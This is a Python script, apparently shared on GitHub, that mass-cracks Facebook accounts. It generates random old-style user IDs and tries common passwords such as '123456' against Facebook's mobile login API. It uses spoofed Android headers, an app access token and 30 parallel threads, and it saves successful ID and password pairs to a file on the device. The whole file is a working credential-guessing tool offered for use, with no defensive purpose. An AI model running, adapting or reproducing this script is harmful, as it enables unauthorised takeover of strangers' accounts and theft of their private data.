# Gift.py love you 🌺🫶

#"""@coded_by : Mohammed Arafat"""
from concurrent.futures import ThreadPoolExecutor as tred
import requests,sys
from os import system as cmd
from random import randint as rr
from random import choice as rc
from string import digits as digits
logo = """      ┏┓┓ ┳┓  ┏┓┓┏┏┓┏┓┓┏┓┳┳┓┏┓
      ┃┃┃ ┃┃  ┃ ┣┫┣ ┃ ┃┫ ┃┃┃┃┓
      ┗┛┗┛┻┛  ┗┛┛┗┗┛┗┛┛┗┛┻┛┗┗┛\n---------------------------------------\n⋙ GITHUB   :  https://github.com/MAGIC-XD\n⋙ FACEBOOK :  MUHAMMAD ARAFAT\n---------------------------------------"""
loop,ok=0,0
class Hacker:
    def __init__(self) -> None:
      self.sex=""
    def main(self):
       self.clear()
       print("⋙ 1. Old Clone 2009-20014\n⋙ 2. Exit Menu");self.linex()
       self.frsc=input("⋙ Select : ")
       if self.frsc == "1":self.settings()
       else:exit("⋙ Thanks For Using !")
    def linex(self):print("---------------------------------------")
    def clear(self):cmd("clear");print(logo)
    def settings(self):
       self.clear();print("⋙ Example : 5000 7000 9000");self.linex()
       self.limit=int(input("⋙ Enter Creak Limit : "));self.user=[]
       for _ in range(self.limit):nmp = ''.join(rc(digits) for _ in range(10));self.user.append(nmp)
       with tred(max_workers=30) as kidz:
           total=str(len(self.user));self.clear()
           print("⋙ Total Uid : %s"%(total))
           print("⋙ Use Data For Best Result ");self.linex()
           for xd in self.user:
               uid=str("10000"+xd);pas=['123456','1234567','12345678','123456789']
               kidz.submit(self.cracker,uid,pas,total)
       print();self.linex();print("⋙ Cracking Complete \n⋙ Total OK : %s"%(ok))
       self.linex();input("⋙ Prees Enter To Exit ");exit()
    def cracker(self,uid,pas,tl):
       global loop,ok
       sys.stdout.write("\r\r⋙ MAGIC-XD ⋙ %s ⋙ OK ⋙ %s "%(loop,ok));sys.stdout.flush()
       try:
          for ps in pas:
              with requests.Session() as session:
                 headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': self.ua(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
              po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
              if "Please Confirm Email" in str(po):
                 print(f"\r\r\033[0;32m [MAGIC-OK]\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/MAGIC-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              elif "session_key" in po:
                 print(f"\r\r\033[0;32m [MAGIC-OK]\033[0;32m {uid} | {ps} \033[0m");open("/sdcard/MAGIC-old-ok.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
                 break
              else:pass
          loop+=1
       except Exception as e:pass
    def ua(self):
       aa = "Dalvik/2.1.0 (Linux; U; Android 7; F5121 Build/TP1A.621813.743) [FBAN/FB4A;FBAV/463.0.0.0.50;FBBV/451606073;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_BD;FBRV/451606073;FBCR/Telkomsel;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/F5121;FBSV/7;FBCA/arm64-v8a:;]"
       return aa
Hacker().main()
